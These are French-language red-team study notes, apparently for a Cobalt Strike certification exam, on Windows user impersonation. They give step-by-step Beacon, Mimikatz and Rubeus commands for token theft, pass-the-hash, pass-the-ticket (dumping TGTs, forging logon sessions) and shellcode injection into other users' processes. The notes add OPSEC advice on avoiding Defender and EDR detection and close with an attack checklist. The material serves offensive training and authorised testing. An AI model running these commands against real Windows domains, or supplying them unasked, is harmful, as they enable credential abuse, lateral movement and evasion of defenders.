# User Impersonation — Usurpation d'identité

> Après les phases **Elevated Persistence** et **Credential Access**, la **User Impersonation** consiste à utiliser une identité associée à des credentials ou tickets obtenus.
> MITRE : **Use Alternate Authentication Material (T1550)**.

Techniques utilisées :
- Token Impersonation (`make_token`, `steal_token`, `token-store`)
- Pass the Hash (PTH)
- Pass the Ticket (PtT)
- Process Injection

---

## Comprendre l'identité sous Windows

```
Logon Session  →  created on successful auth, holds LUID + creds + Kerberos tickets
     ↓
Access Token   →  created from logon session, attached to every process/thread
     ↓
Credential Cache (LSASS) → plaintext, NTLM hashes, AES keys, Kerberos tickets stored per session
```

**Point important pour l'examen :** `getuid` et `whoami` lisent le **primary access token du processus**, et
pas nécessairement le token utilisé pour l'impersonation. Après PtH ou PtT, `getuid` peut donc afficher l'utilisateur d'origine : c'est attendu.

---

## Token Impersonation

### make_token — Credentials en clair et nouvelle session de logon

```cs
// OPSEC-SAFE — no high-integrity required, no logon event (type 9 NewCredentials)
// Network auth uses new token, local actions unaffected
beacon> make_token CONTOSO\rsteel FakePass

// Confirm context changed in CS beacon header (shows impersonated user)
beacon> getuid

// Revert when done
beacon> rev2self
```

> Utilise les API `LogonUserA` et `ImpersonateLoggedOnUser`.
> Crée une session de logon de **type 9 (NewCredentials)**, avec un profil différent des types 2 et 3.
> Ne nécessite **pas** une session high integrity.

---

### steal_token — Récupérer le token d'un autre processus

```cs
// OPSEC-SAFE — requires HIGH-INTEGRITY session
// Step 1 — identify target process running as desired user
beacon> process_browser     // GUI tab — find process owned by target user, right-click → steal token

// Step 2 — steal token from that PID
beacon> steal_token <PID>

// Step 3 — revert when done
beacon> rev2self
```

> API utilisées en interne : `OpenProcess` → `OpenProcessToken` → `DuplicateToken` → `ImpersonateLoggedOnUser`
> Nécessite un Beacon en **high integrity**. Le token peut devenir indisponible à la fermeture du processus cible ; `token-store` permet de conserver la référence.

---

### token-store — Conserver les tokens récupérés

```cs
// Steal token AND add to store (survives process close)
beacon> token-store steal <PID>

// List tokens in store
beacon> token-store show

// Use a stored token (by index)
beacon> token-store use <ID>

// Remove a token from store
beacon> token-store remove <ID>

// Revert impersonation (token remains in store)
beacon> rev2self
```

> Le noyau conserve les références aux tokens : le store maintient un handle ouvert, ce qui peut préserver le token après la fermeture du processus.

---

## Pass the Hash (PTH)

```cs
// Built-in — wrapper around sekurlsa::pth
// OPSEC-CAUTION — Defender may block this; patches NTLM hash into logon session credential cache
beacon> pth CONTOSO\jsmith <NTLM_hash>

// If blocked by Defender — alternate approach:
// Run Mimikatz to spawn a sacrificial process, steal its token manually
beacon> mimikatz sekurlsa::pth /user:jsmith /domain:CONTOSO /ntlm:<hash> /run:notepad.exe
beacon> steal_token <PID of spawned notepad>
beacon> rev2self
```

> **Le trafic NTLM peut être considéré comme anormal** — dans les environnements qui privilégient désormais Kerberos.
> NTLM peut être restreint sur les systèmes renforcés. Dans ces notes, **PtT** est privilégié lorsque c'est possible.
> Le **PtH** concerne l'authentification réseau, sans modifier l'identité des opérations locales.

---

## Pass the Ticket (PtT)

> Le **PtT** utilise Kerberos et ne requiert pas la modification de la mémoire LSASS. Son comportement diffère de PtH et des protections PPL.

### Méthode 1 — Commande native Beacon (`kerberos_ticket_use`)

```cs
// Step 1 — triage tickets on compromised host to find a target TGT
beacon> krb_triage
// Look for: rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM

// Step 2 — dump the target TGT
beacon> krb_dump /user:rsteel /service:krbtgt

// Step 3 — save base64 ticket to attacker desktop (run on CS client, not beacon)
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64_TICKET]"))

// Step 4 — create new sacrificial logon session (fake password — plaintext not known)
beacon> make_token CONTOSO\rsteel FakePass

// Step 5 — inject TGT into the new logon session
// Path = path on CS CLIENT machine (attacker desktop), not beacon host
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

// Step 6 — verify ticket present
beacon> run klist

// Step 7 — access target resource
beacon> ls \\lon-ws-1\c$

// Step 8 — drop impersonation when done
beacon> rev2self
```

> `make_token` crée une session de logon isolée afin de ne pas remplacer le TGT de la session utilisateur initiale.
> `kerberos_ticket_purge` supprime les tickets de la session sans fermer celle-ci.
> Après `rev2self`, la session temporaire n'est plus utilisée pour l'impersonation.

---

### Méthode 2 — Rubeus (`createnetonly` + `ptt`)

```cs
// Step 1 — request TGT using AES key (preferred over NTLM hash — avoids RC4 anomaly)
beacon> execute-assembly Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<key> /nowrap /opsec

// Step 2 — spawn hidden process in new logon session, get PID + LUID
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show

// Step 3 — inject ticket into that new logon session
beacon> execute-assembly Rubeus.exe ptt /ticket:<B64_TICKET> /luid:<LUID>

// Step 4 — steal token from the spawned process
beacon> steal_token <PID>

// Step 5 — drop impersonation and kill spawned process when done
beacon> rev2self
beacon> kill <PID>
```

> L'option `/opsec` de `asktgt` favorise une demande de ticket chiffré en AES plutôt qu'une utilisation inhabituelle de RC4.
> `createnetonly` joue un rôle comparable à `make_token` dans un workflow PtT.

---

### Demander un TGT avec un hash ou une clé

```cs
// AES256 key (preferred — produces Kerberos-native AES ticket)
beacon> execute-assembly Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<aes256_key> /nowrap /opsec

// NTLM hash (produces RC4 ticket — more anomalous, avoid if AES available)
beacon> execute-assembly Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /rc4:<ntlm_hash> /nowrap
```

---

## Process Injection — Autre méthode

```cs
// Requires HIGH-INTEGRITY session
// Step 1 — find process owned by target user
beacon> process_browser     // GUI tab — find process owned by target user, right-click → steal token

// Step 2 — inject beacon shellcode into that process
// New beacon session runs in target process address space = target user context
beacon> inject <PID> x64 <listener>
```

> **OPSEC-CAUTION :** `inject` utilise par défaut `CreateRemoteThread`, détectable par un EDR.
> À envisager uniquement si l'impersonation par token n'est pas possible.

---

## Comparaison OPSEC

| Technique | Integrity requise | Événement logon | Accès LSASS | Kerberos | OPSEC |
|-----------|---------------|-------------|-------------|----------|-------|
| `make_token` | Toute | Type 9 | Non | Non | SAFE |
| `steal_token` | HIGH | Aucun | Non | Non | SAFE |
| `token-store steal` | HIGH | Aucun | Non | Non | SAFE |
| `pth` (natif) | Toute | Type 9 | Modifie LSASS | Non | CAUTION |
| PtT (`kerberos_ticket_use`) | Toute | Aucun | Non | Oui | SAFE |
| PtT (Rubeus `ptt`) | Toute | Aucun | Non | Oui | SAFE |
| `inject` | HIGH | Aucun | Non | Non | CAUTION |

---

## Comprendre `getuid` — Note pour l'examen

```
steal_token / PtH / PtT all show original user in getuid output.
getuid reads PRIMARY ACCESS TOKEN of the process — not the impersonated token.
This is expected. Verify impersonation worked by attempting resource access (ls \\target\c$).
```

---

## Checklist pour l'examen

```
1. Identify credential material type: plaintext / NTLM hash / AES key / Kerberos ticket
2. Choose technique:
   - Plaintext creds available     → make_token
   - Process running as target     → steal_token (requires high-integrity)
   - NTLM hash only                → pth (CAUTION — Defender may block)
   - AES key / ticket available    → PtT via Rubeus asktgt + ptt (preferred)
   - TGT in memory on host         → krb_triage → krb_dump → make_token → kerberos_ticket_use
3. Always make_token first before kerberos_ticket_use — isolate session, don't clobber real user TGT
4. Verify access: ls \\target\c$ or dir \\target\share
5. rev2self when done — clean up impersonation
6. token-store steal if you need to persist the token beyond process lifetime
```
